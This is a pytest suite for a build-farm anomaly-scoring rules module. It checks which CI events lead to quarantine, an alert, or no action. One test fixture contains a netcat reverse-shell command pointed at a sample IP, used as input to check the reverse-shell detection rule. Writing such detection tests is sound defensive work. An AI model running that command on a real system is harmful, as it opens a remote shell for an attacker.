"""core/rules: what must be pulled out of the farm, and why -- one event at a
time, as the Flink job scores it."""

import pytest

from core.rules import action_for, score_event

QUIET = dict(
    runner_ip="192.168.1.10", event_type="DEPENDENCY_FETCH", is_internal_ip=1,
    events_1m=40, failed_builds_1m=0, failed_builds_5m=0, unique_projects_5m=1,
    oom_kills_5m=0, distinct_exit_codes_5m=0, compile_steps_5m=0,
    build_frequency=0.0, is_night=0, command="", url_path="/maven2/org/x/x-1.0.jar",
    http_status=200, failure_signature="", is_failure_signature=0,
    is_untrusted_fetch=0, is_rogue_command=0, is_privileged=0, is_slow_step=0, process_uid=1001,
    rogue_commands_5m=0, failure_signatures_5m=0, http_errors_5m=0,
    dependency_404_1m=0, distinct_artifacts_5m=3, published_bytes_5m=200_000,
    slow_steps_5m=0,
)


def decide(**overrides):
    return score_event(dict(QUIET, **overrides))


@pytest.mark.parametrize(
    "overrides, rule",
    [
        (dict(failure_signature="checksum_mismatch", is_failure_signature=1), "cache_poisoned"),
        (dict(failure_signature="ice", is_failure_signature=1), "compiler_crash"),
        (dict(failure_signature="disk_full", is_failure_signature=1), "disk_full"),
        (dict(is_rogue_command=1), "rogue_command"),
        (dict(event_type="COMPILE_STEP", command="nc -e /bin/sh 1.2.3.4 4444"), "reverse_shell"),
        (dict(is_rogue_command=1, is_privileged=1), "rogue_command_as_root"),
        (dict(failed_builds_1m=38), "failure_storm"),
        (dict(unique_projects_5m=9, failed_builds_5m=60), "broken_toolchain"),
        (dict(oom_kills_5m=8), "oom_kill_storm"),
        (dict(slow_steps_5m=6), "repeated_slow_steps"),
        (dict(dependency_404_1m=45), "dependency_not_found_storm"),
        (dict(published_bytes_5m=400_000_000), "artifact_bloat"),
        (dict(failure_signatures_5m=7), "repeated_failure_signatures"),
    ],
)
def test_each_incident_is_quarantined_with_its_reason(overrides, rule):
    decision = decide(**overrides)
    assert decision["recommended_action"] == "quarantine"
    assert rule in decision["rule_hits"].split(",")


def test_normal_traffic_is_ok():
    decision = decide()
    assert decision["recommended_action"] == "ok"
    assert decision["rule_hits"] == ""


@pytest.mark.parametrize(
    "overrides",
    [
        # all of these look alarming in isolation and are routine here
        dict(is_privileged=1, process_uid=0, command="gcc -O2 -c src/net/parser.c"),
        dict(http_status=404, dependency_404_1m=3),
        dict(events_1m=800),                    # the CI farm, every morning
        dict(published_bytes_5m=60_000_000),    # a busy build server's uploads
        dict(event_type="BUILD_FAILURE", failed_builds_1m=2, failed_builds_5m=9),
        dict(event_type="BUILD_SUCCESS", failed_builds_5m=9),
    ],
)
def test_benign_look_alikes_are_not_quarantined(overrides):
    assert decide(**overrides)["recommended_action"] == "ok"


@pytest.mark.parametrize(
    "overrides, rule",
    [
        (dict(failure_signature="oom", is_failure_signature=1), "oom_kill"),
        (dict(is_untrusted_fetch=1, url_path="/unofficial/mirror/libssl-9.9.jar"), "untrusted_fetch"),
        (dict(event_type="COMPILE_STEP", is_slow_step=1), "slow_step"),
        (dict(event_type="BUILD_SUCCESS", failed_builds_5m=40), "pass_after_failure_storm"),
    ],
)
def test_a_lone_suspect_event_alerts_but_does_not_quarantine(overrides, rule):
    decision = decide(**overrides)
    assert decision["recommended_action"] == "alert"
    assert decision["rule_hits"] == rule


def test_every_rule_that_fired_is_recorded_strongest_first():
    decision = decide(failure_signature="ice", is_failure_signature=1, event_type="COMPILE_STEP", is_slow_step=1)
    assert decision["rule_hits"] == "compiler_crash,slow_step"
    assert decision["final_anomaly_score"] == pytest.approx(0.95)


def test_action_thresholds():
    assert action_for(0.95) == "quarantine"
    assert action_for(0.70) == "alert"
    assert action_for(0.30) == "ok"
